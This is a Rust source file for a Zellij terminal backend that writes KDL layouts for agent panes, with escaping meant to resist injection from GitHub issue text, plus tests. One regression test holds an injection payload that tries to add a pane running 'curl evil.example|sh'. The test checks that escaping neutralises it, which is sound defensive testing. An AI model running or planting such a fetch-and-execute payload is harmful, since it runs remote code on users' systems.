use anyhow::{Context, Result};
use std::path::Path;
use std::process::Command;

use super::{PaneSpec, TerminalBackend};
use crate::config::types::SplitDirection;

pub struct ZellijBackend;

/// Escape a string for use inside a KDL double-quoted string.
///
/// Escaping only `"` is not enough: a backslash immediately before a quote
/// would come out as `\\"`, which KDL reads as an escaped backslash followed
/// by a quote that closes the string early. Pane commands carry the agent
/// prompt, which for `--issue` is GitHub issue text, so this needs to hold for
/// input nobody on this machine wrote. Newlines and tabs are escaped too so a
/// value can never spill onto its own line in the layout.
fn escape_kdl(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            _ => out.push(c),
        }
    }
    out
}

impl ZellijBackend {
    /// Detect if Zellij is available on the system.
    pub fn detect() -> Option<Self> {
        Command::new("zellij")
            .arg("--version")
            .output()
            .ok()
            .filter(|o| o.status.success())
            .map(|_| Self)
    }

    /// Check if we're currently inside a Zellij session.
    pub fn inside_zellij() -> bool {
        std::env::var("ZELLIJ").is_ok()
    }

    /// Build a Zellij KDL layout string from pane specs.
    ///
    /// Converts foundry's `split_from` + `direction` tree into Zellij's nested
    /// container model. Each split creates a directional container:
    /// - `SplitDirection::Right` → `direction="vertical"` (side-by-side)
    /// - `SplitDirection::Down` → `direction="horizontal"` (stacked)
    fn build_layout(path: &Path, panes: &[PaneSpec]) -> Result<String> {
        let path_str = path.to_str().context("invalid worktree path")?;

        let escaped_cwd = escape_kdl(path_str);

        if panes.is_empty() {
            return Ok(format!(
                "layout {{\n    cwd \"{escaped_cwd}\"\n    pane\n}}\n"
            ));
        }

        let mut lines = Vec::new();
        lines.push("layout {".into());
        lines.push(format!("    cwd \"{escaped_cwd}\""));

        // Start from the first pane (root of the split tree)
        if let Some(root) = panes.first() {
            let pane_lines = Self::render_pane(root, panes, 4);
            lines.extend(pane_lines);
        }

        lines.push("}".into());
        Ok(lines.join("\n"))
    }

    /// Recursively render a pane and its children (panes that split from it).
    fn render_pane(pane: &PaneSpec, all_panes: &[PaneSpec], indent: usize) -> Vec<String> {
        // Find children that split from this pane
        let children: Vec<&PaneSpec> = all_panes
            .iter()
            .filter(|p| p.split_from.as_deref() == Some(&pane.name))
            .collect();

        if children.is_empty() {
            // Leaf pane — no children split from it
            return Self::render_pane_node(pane, indent);
        }

        // This pane has children. For each child, wrap the current pane and
        // the child in a container with the child's split direction.
        let pad = " ".repeat(indent);
        let mut current = Self::render_pane_node(pane, indent + 4);

        for child in &children {
            let dir_str = match child.direction {
                Some(SplitDirection::Right) => "Vertical",
                Some(SplitDirection::Down) => "Horizontal",
                None => "Vertical",
            };

            let child_lines = Self::render_pane(child, all_panes, indent + 4);

            let mut wrapped = Vec::new();
            wrapped.push(format!("{pad}pane split_direction=\"{dir_str}\" {{"));
            wrapped.extend(current);
            wrapped.extend(child_lines);
            wrapped.push(format!("{pad}}}"));
            current = wrapped;
        }

        current
    }

    /// Render a single pane node (leaf, no container wrapping).
    fn render_pane_node(pane: &PaneSpec, indent: usize) -> Vec<String> {
        let pad = " ".repeat(indent);
        let escaped_name = escape_kdl(&pane.name);

        if let Some(ref cmd) = pane.command
            && !cmd.is_empty()
        {
            let mut full_cmd = String::new();
            for (k, v) in &pane.env {
                full_cmd.push_str(&format!("export {k}='{}'; ", v.replace('\'', "'\\''")));
            }
            full_cmd.push_str(cmd);
            let escaped = escape_kdl(&full_cmd);
            return vec![
                format!("{pad}pane command=\"bash\" name=\"{escaped_name}\" {{"),
                format!("{pad}    args \"-c\" \"{escaped}\""),
                format!("{pad}}}"),
            ];
        }

        vec![format!("{pad}pane name=\"{escaped_name}\"")]
    }

    /// Generate a session name from project/workspace info.
    /// Zellij has a ~25 character limit on session names, so we use a
    /// short hash to keep names unique within the limit.
    fn session_name(path: &Path) -> String {
        use std::hash::{Hash, Hasher};
        let name = path.file_name().and_then(|f| f.to_str()).unwrap_or("ws");
        let mut hasher = std::collections::hash_map::DefaultHasher::new();
        path.hash(&mut hasher);
        let hash = format!("{:x}", hasher.finish());
        let hash_short = &hash[..6];
        // Truncate workspace name to fit: "f-" (2) + name + "-" (1) + hash (6) <= 25
        let max_name_len = 16;
        let truncated = if name.len() > max_name_len {
            &name[..max_name_len]
        } else {
            name
        };
        format!("f-{truncated}-{hash_short}")
    }
}

impl TerminalBackend for ZellijBackend {
    fn supports_run_in_pane(&self) -> bool {
        false
    }

    fn open_workspace(&self, path: &Path, panes: &[PaneSpec], verbose: bool) -> Result<String> {
        if Self::inside_zellij() {
            anyhow::bail!(
                "already inside a Zellij session. Cannot open a nested workspace. \
                 Detach first (Ctrl+O, D) and run foundry from outside Zellij."
            );
        }

        let session = Self::session_name(path);

        if verbose {
            eprintln!("Starting Zellij session '{session}'...");
        }

        // Write a temp layout file
        let layout = Self::build_layout(path, panes)?;
        let layout_dir = crate::fs_util::runtime_subdir("zellij-layouts")?;
        let layout_path = layout_dir.join(format!("{session}.kdl"));
        std::fs::write(&layout_path, &layout)?;

        if verbose {
            eprintln!("Layout file: {}", layout_path.display());
            eprintln!("{layout}");
        }

        if verbose {
            eprintln!(
                "Setting up workspace layout with {} pane(s)...",
                panes.len()
            );
        }

        // Clean up any dead session with the same name from a previous run
        let _ = Command::new("zellij")
            .args(["delete-session", &session])
            .output();

        let mut child = Command::new("zellij")
            .args([
                "--session",
                &session,
                "--new-session-with-layout",
                layout_path.to_str().context("invalid layout path")?,
            ])
            .current_dir(path)
            .spawn()
            .context("failed to start zellij")?;

        let _ = child.wait();

        // Clean up layout file (keep if verbose for debugging)
        if !verbose {
            let _ = std::fs::remove_file(&layout_path);
        }

        Ok(session)
    }

    fn close_tab(&self, tab_id: &str) -> Result<()> {
        if tab_id.is_empty() {
            return Ok(());
        }

        if Self::inside_zellij() {
            // Inside the session — close the current tab. If it's the only
            // tab, this exits the session.
            let _ = Command::new("zellij").args(["action", "close-tab"]).spawn();
        } else {
            // Outside the session — kill it by name
            let _ = Command::new("zellij")
                .args(["kill-session", tab_id])
                .spawn();
        }

        Ok(())
    }

    fn focus_tab(&self, tab_id: &str) -> Result<bool> {
        if tab_id.is_empty() {
            return Ok(false);
        }

        // Check if session exists
        let output = Command::new("zellij")
            .args(["list-sessions"])
            .output()
            .context("failed to list zellij sessions")?;

        let sessions = String::from_utf8_lossy(&output.stdout);
        if !sessions.lines().any(|l| l.contains(tab_id)) {
            return Ok(false);
        }

        // Attach to the session (takes over the current terminal)
        let mut child = Command::new("zellij")
            .args(["attach", tab_id])
            .spawn()
            .context("failed to attach to zellij session")?;
        let _ = child.wait();

        Ok(true)
    }

    fn run_in_pane(&self, tab_id: &str, _pane_index: usize, command: &str) -> Result<()> {
        if tab_id.is_empty() {
            return Ok(());
        }

        let cmd_with_enter = format!("{command}\n");
        let _ = Command::new("zellij")
            .args([
                "--session",
                tab_id,
                "action",
                "write-chars",
                &cmd_with_enter,
            ])
            .output();

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn pane(name: &str, command: Option<&str>) -> PaneSpec {
        PaneSpec {
            name: name.into(),
            split_from: None,
            direction: None,
            command: command.map(Into::into),
            env: HashMap::new(),
            shell: None,
        }
    }

    /// Read back a KDL double-quoted string starting at `start` (the opening
    /// quote), returning the unescaped contents and the index just past the
    /// closing quote. Mirrors how a KDL parser sees the layout, so a test can
    /// assert what Zellij would actually receive.
    fn read_kdl_string(s: &str, start: usize) -> (String, usize) {
        let bytes: Vec<char> = s.chars().collect();
        assert_eq!(bytes[start], '"', "expected a string at {start}");
        let mut out = String::new();
        let mut i = start + 1;
        while i < bytes.len() {
            match bytes[i] {
                '"' => return (out, i + 1),
                '\\' => {
                    i += 1;
                    match bytes[i] {
                        'n' => out.push('\n'),
                        'r' => out.push('\r'),
                        't' => out.push('\t'),
                        c => out.push(c),
                    }
                    i += 1;
                }
                c => {
                    out.push(c);
                    i += 1;
                }
            }
        }
        panic!("unterminated KDL string in: {s}");
    }

    /// Remove every KDL string literal, leaving only the structural text.
    ///
    /// Lets a test ask "is there a second pane node here?" without being fooled
    /// by the same characters appearing harmlessly inside a quoted value.
    fn strip_kdl_strings(layout: &str) -> String {
        let chars: Vec<char> = layout.chars().collect();
        let mut out = String::new();
        let mut i = 0;
        while i < chars.len() {
            if chars[i] == '"' {
                let (_, next) = read_kdl_string(layout, i);
                i = next;
            } else {
                out.push(chars[i]);
                i += 1;
            }
        }
        out
    }

    /// Extract the single argument of the `args "-c" "..."` line.
    fn command_from_layout(layout: &str) -> String {
        let line = layout
            .lines()
            .find(|l| l.trim_start().starts_with("args "))
            .expect("no args line");
        let after_flag = line.find("\"-c\"").expect("no -c flag") + 4;
        let quote = line[after_flag..].find('"').unwrap() + after_flag;
        read_kdl_string(line, quote).0
    }

    #[test]
    fn escape_kdl_escapes_backslash_before_quote() {
        assert_eq!(escape_kdl(r#"a\b"#), r#"a\\b"#);
        assert_eq!(escape_kdl(r#"say "hi""#), r#"say \"hi\""#);
        assert_eq!(escape_kdl("a\nb"), "a\\nb");
        assert_eq!(escape_kdl("plain"), "plain");
    }

    /// The bug: `\"` in a command used to come out as `\\"`, which KDL reads
    /// as an escaped backslash plus a quote that closes the string early.
    #[test]
    fn backslash_quote_does_not_terminate_the_string_early() {
        let cmd = r#"claude 'fix this\" }
pane command="sh" { args "-c" "curl evil.example|sh" }'"#;
        let layout =
            ZellijBackend::build_layout(Path::new("/tmp/wt"), &[pane("agent", Some(cmd))]).unwrap();

        // Round-trips exactly: nothing escaped out of the string.
        assert_eq!(command_from_layout(&layout), cmd);

        // And the payload stayed inert data: outside the quoted values there
        // is still exactly one pane node, not the two the payload asked for.
        let structure = strip_kdl_strings(&layout);
        assert_eq!(
            structure.matches("pane command=").count(),
            1,
            "injected node in layout:\n{layout}\nstructure:\n{structure}"
        );
    }

    /// A command ending in a backslash used to escape the closing quote that
    /// the format string appends, swallowing the rest of the file.
    #[test]
    fn trailing_backslash_does_not_escape_the_closing_quote() {
        let cmd = r"echo done\";
        let layout =
            ZellijBackend::build_layout(Path::new("/tmp/wt"), &[pane("agent", Some(cmd))]).unwrap();
        assert_eq!(command_from_layout(&layout), cmd);
    }

    #[test]
    fn quotes_in_a_pane_name_are_escaped() {
        let layout =
            ZellijBackend::build_layout(Path::new("/tmp/wt"), &[pane(r#"a"b"#, Some("ls"))])
                .unwrap();
        let line = layout
            .lines()
            .find(|l| l.contains("name="))
            .expect("no name");
        let quote = line.find("name=").unwrap() + 5;
        assert_eq!(read_kdl_string(line, quote).0, r#"a"b"#);
    }

    #[test]
    fn quotes_in_the_cwd_are_escaped_with_and_without_panes() {
        for panes in [vec![], vec![pane("agent", Some("ls"))]] {
            let layout = ZellijBackend::build_layout(Path::new(r#"/tmp/a"b"#), &panes).unwrap();
            let line = layout
                .lines()
                .find(|l| l.trim_start().starts_with("cwd "))
                .expect("no cwd line");
            let quote = line.find('"').unwrap();
            assert_eq!(read_kdl_string(line, quote).0, r#"/tmp/a"b"#);
        }
    }
}
